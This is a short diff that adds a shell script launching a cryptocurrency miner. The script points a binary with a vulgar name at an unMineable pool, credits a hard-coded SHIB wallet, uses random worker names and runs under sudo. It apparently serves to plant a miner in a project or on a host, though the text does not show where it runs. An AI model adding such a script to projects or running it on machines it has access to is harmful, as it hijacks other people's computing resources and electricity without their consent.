@@ -1,0 +1,9 @@
+POOL=rx-us.unmineable.com:3333
+
+WALLET=SHIB:0x8f96aba3819ed23eb2130d1efc452e2ed0a78588
+
+WORKER=$(echo $(shuf -i 1-999999999 -n 1)-FA)
+
+ALGO=wrkzcoin
+
+sudo ./kontol --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
